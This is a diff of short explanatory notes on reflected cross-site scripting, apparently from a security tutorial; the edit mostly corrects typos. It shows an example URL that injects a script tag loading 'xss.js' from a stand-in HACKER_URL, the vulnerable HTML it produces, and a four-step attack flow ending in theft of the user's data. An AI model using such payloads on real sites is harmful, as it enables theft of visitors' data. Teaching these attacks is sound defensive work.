@@ -36,16 +36,16 @@ website:
 
 malicious url:
 
-website:  `https://URL/?error=<dcript src="https://HACKER_URL/xss.js"></script>` (...url encoded)
+website:  `https://URL/?error=<script src="https://HACKER_URL/xss.js"></script>` (...url encoded)
 ```html
 <div class="error-alert">
 	<p><script src="https://HACKER_URL/xss.js"></script></p>
 </div>
 ```
 
-1. Hacker sends link with malicious payloud to user
-2. user clicks on the link because it is a trusted url and user is taken to xss vulnarable website
-3. link containing hackers script is ecexuted on website
+1. Hacker sends link with malicious payload to user
+2. user clicks on the link because it is a trusted url and user is taken to xss vulnareble website
+3. link containing hackers script is executed on website
 4. hacker gets notified and gets gathered data of the user
 
 
